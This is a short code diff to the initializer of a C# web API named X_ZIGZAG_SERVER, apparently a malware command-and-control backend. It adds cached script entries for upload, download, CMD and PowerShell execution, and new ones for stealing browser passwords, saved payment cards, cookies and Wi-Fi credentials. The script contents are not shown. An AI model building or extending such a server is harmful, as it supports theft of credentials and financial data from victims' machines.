@@ -11,12 +11,16 @@ namespace X_ZIGZAG_SERVER_WEB_API.Data
     {
         public static void Initialize(MyDbContext context,IMemoryCache cache , IHostEnvironment hostEnvironment)
         {
-            // UPLOAD AND DOWNLOAD
+            cache.Set(0, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "UPLOAD.txt")));
+            cache.Set(1, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "DOWNLOAD.txt")));
             cache.Set(2, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "CMD.txt")));
-            cache.Set(3, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "POWERSHELL.txt")));
+            cache.Set(3, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "POWERSHELL.txt"))); 
             // 4
             cache.Set(5, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "WIFI.txt")));
-      
+            cache.Set(6, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "BROWSER_PASSWORDS.txt")));
+            cache.Set(7, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "BROWSER_CARDS.txt")));
+            cache.Set(8, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "BROWSER_COOKIES.txt")));
+
             context.Database.EnsureCreated();
             if (context.Admins.Any())
             {
